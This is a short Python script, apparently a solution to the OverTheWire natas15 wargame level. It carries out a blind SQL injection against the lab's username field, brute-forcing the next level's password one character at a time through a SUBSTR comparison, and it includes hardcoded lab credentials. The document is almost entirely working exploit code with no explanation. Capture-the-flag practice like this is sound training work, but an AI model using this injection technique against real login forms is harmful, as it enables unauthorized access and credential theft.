import requests
import sys

password = ""

while len(password) < 32:
	for char in list('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'):
		print {'username':'natas16" and SUBSTR(password, %d, 1) = "%s' % (len(password)+1, char)}
		res = requests.post('http://natas15.natas.labs.overthewire.org/', data={'username':'natas16" and binary SUBSTR(password, %d, 1) = "%s' % (len(password)+1, char)}, auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
		if "user exists" in res.text:
			password += char
			print 'Current password:', password
			break

print 'nastas16:%s' % password